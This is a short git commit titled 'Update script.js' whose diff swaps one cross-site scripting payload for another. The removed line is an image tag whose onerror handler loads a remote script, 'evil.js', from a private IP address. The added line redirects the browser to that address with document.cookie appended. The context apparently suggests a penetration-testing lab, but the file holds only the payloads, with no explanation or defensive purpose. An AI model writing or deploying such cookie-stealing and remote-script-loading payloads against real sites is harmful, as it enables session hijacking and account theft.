f1260ca4268fb941c39e184b520f805001954796
amotii <90158583+amotii@users.noreply.github.com>
2024-04-29 00:23:16 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-<img SRC=x onerror="var script1 = document.createElement('script'); script1.src='http://10.10.14.148/evil.js';document.head.appendChild(script1);"/>
+document.location="http://10.10.14.148/?c="+document.cookie
